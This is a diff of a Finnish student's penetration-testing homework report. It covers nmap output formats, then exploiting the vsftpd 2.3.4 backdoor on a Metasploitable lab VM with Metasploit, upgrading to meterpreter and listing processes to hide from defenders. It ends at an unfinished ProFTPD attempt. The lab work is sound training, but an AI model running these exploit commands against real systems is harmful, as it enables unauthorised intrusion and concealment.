@@ -121,14 +121,14 @@ Vaikka help-ohjeissa ei mainittu porttivälien määrityksestä, päätin kokeil
 
 Tiedostomuodot:
 
-- xml
+- file.xml
   - nätin näköinen raportti
   - "A key advantage of XML is that you do not need to write your own parser as you do for specialized Nmap output types such as grepable and interactive output. Any general XML parser should do." (nmap.org s.a.)
 
-Jotta nmap xml-tiedoston saa auki selaimessa pitää ensin avata koneelle http-palvelin. Ainakaan oma versioni Mozilla Firefoxista (115.15.0esr) ei suostunut avaamaan xml-tiedostoa nätisti. Ongelmana on "CORS request not HTTP". Selain ei suostu tietoturvasyistä lataamaan "ulkopuolisesta" lähteestä tyylitiedostoa. Jotta sain sen toimimaan, tein seuraavasti.
+Jotta nmap xml-tiedoston saa auki selaimessa pitää ensin avata koneelle http-palvelin. Ainakaan oma versioni Mozilla Firefoxista (115.15.0esr) ei suostunut avaamaan xml-tiedostoa nätisti. Ongelmana on "CORS request not HTTP" (mdn web docs s.a. a). Selain ei suostu tietoturvasyistä lataamaan "ulkopuolisesta" lähteestä tyylitiedostoa. Jotta sain sen toimimaan, tein seuraavasti.
 
     cp /usr/share/nmap/nmap.xsl ~    # kopioidaan tyylitiedosto hakemistoon, jossa h2_ms2.xml tiedosto sijaitsee
-    python3 -m http.server           # avataan testausserveri, python3 asennettu käyttiksen mukana
+    python3 -m http.server           # avataan testausserveri (mdn web docs s.a. b)
     nano h2_ms2.xml                  # file://path/to/xsl korvataan http://localhost:8000/nmap.xsl
 
 Tämän jälkeen selaimessa: ``http://localhost:8000/h2_ms2.xml``.
@@ -136,10 +136,75 @@ Tämän jälkeen selaimessa: ``http://localhost:8000/h2_ms2.xml``.
 ![image](https://github.com/user-attachments/assets/a70d8dd3-8563-4f9f-a440-74e622f10e92)
 > Kuva 13. XML-tiedosto tulostuu nätisti selaimessa.
 
+- file.gnmap
+  - grepable nmap
+  - tämän pitäisi olla grep-ohjelman kanssa käypä, mutta en ymmärrä miten
+  - lisäksi "deprecated" eli tätä toimintoa ei enää päivitetä
+
+![image](https://github.com/user-attachments/assets/445fd64d-25cf-4ff2-852b-9d245d9cec02)
+> Kuva 14. Ei kovinkaan grepable...
+
+Todennäköisesti käytän tätä väärin. Epäintuitiivinen formaatti.
+
+- file.nmap
+  - standard nmap output
+  - tämä tulostuu kun ajaa spesifioimatta output-formaattia
+
+![image](https://github.com/user-attachments/assets/6891b6db-a6dd-41a4-9541-96695a8808f9)
+> Kuva 15. Grepaus nmap-tiedostoon.
+
+Grepaaminen nmap-tiedostoon on ainakin minun silmääni luettavampi.
+
+## g) Murtaudu Metasploitablen vsftpd-palveluun
+
+Seurasin Jacobsin (2024) ohjeita kohdasta 3 (Gaining Access) eteenpäin.
+
+    search vsftpd    # etsii haavoittuvuuksia vsftpd-palvelusta
+    use exploit/unix/ftp/vsftpd_234_backdoor    # valitsee haavoittuvuuden
+    set RHOSTS 192.168.56.101    # lukoitsee kohteen
+    run    # suorittaa exploitin
+    
+![image](https://github.com/user-attachments/assets/ea4c36b4-d2ce-4d6e-85d2-d104a2f2001d)
+> Kuva 16. Metasploitablen juuressa.
+
+## h) Päivitä äskeisen vsftpd-murron yhteydessä syntynyt sessio meterpretriin
+
+Teron [vinkeistä](https://terokarvinen.com/tunkeutumistestaus/#h2-social-sploit) päättelin, että Ctrl + z siirtää session taustalle. Tämän jälkeen tarkistin ``sessions -h`` miten päivitetään sessio meterpreteriin.
+
+    sessions -u 1
+
+Tämä löytyikin myös Teron vinkeistä.
+
+## i) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta. Analysoi tiedot. Selitä, miten niitä voisi hyödyntää.
+
+Tästä oli tietoa tiivistelmän aiheessa (Jaswal 2020). Jaswal listaa meterpreter-komentoja; minua kiinnostaa tässä vaiheessa prosessien id:t. Mikä prosessi kohteessa on minulla käytössä ja mihin prosessiin voisin piiloutua (ts. siirtää nykyisen)?
+
+    msf6 > sessions -i 2    # sessio 2 on meterpreter sessio, -i mahdollistaa meterpreter-spesifit komennot
+    meterpreter > getpid    # kertoo prosessi-id:n, joka on hyökkäyksessä käytössä
+    meterpreter > ps        # listaa kaikki prosessit
+
+Tietoja kohteen prosesseista voi siis hyödyntää kätketäkseen oman läsnäolon hyökkäjänä puolustajilta.
+
+## j) Murtaudu Metasploitableen jollain toisella tavalla.
+
+Metasploit consolessa listataan palvelut ``services``. Ftp on käytössä myös palvelulla ProFTPD. Alla olevan kuvan hakutuloslistauksessa viimeisin (kohdan 17) kuvauksessa sanotaan "Back door command execution". Kokeillaan sitä.
+
+![image](https://github.com/user-attachments/assets/0b547b60-8747-441a-8acb-2c5419b3d954)
+> Kuva 17. ``search proftp`` tulokset.
+
+    use 17
+    
+
 ## Lähteet
+
+Jacobs, J. 2024. Exploiting vsftpd in Metasploitable 2. Luettavissa: https://medium.com/@jasonjayjacobs/exploiting-vsftpd-in-metasploitable-2-cf975ead1173 Luettu: 2024-11-03
 
 Jaswal, N. 2020. Mastering Metasploit. Packt Publishing. Luettavissa: https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idTextAnchor017 Luettu: 2024-11-02
 
 Karvinen, T. 2024. Tunkeutumistestaus. H2 Social sploit. Luettavissa: https://terokarvinen.com/tunkeutumistestaus/#h2-social-sploit Luettu: 2024-11-02
+
+mdn web docs s.a. a. Reason: CORS request not HTTP. Luettavissa: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS/Errors/CORSRequestNotHttp Luettu: 2024-11-03
+
+mdn web docs s.a. b. How do you set up a local testing server? Luettavissa: https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Tools_and_setup/set_up_a_local_testing_server Luettu: 2024-11-03
 
 nmap.org s.a. XML Output (-oX). Luettavissa: https://nmap.org/book/output-formats-xml-output.html Luettu: 2024-11-03
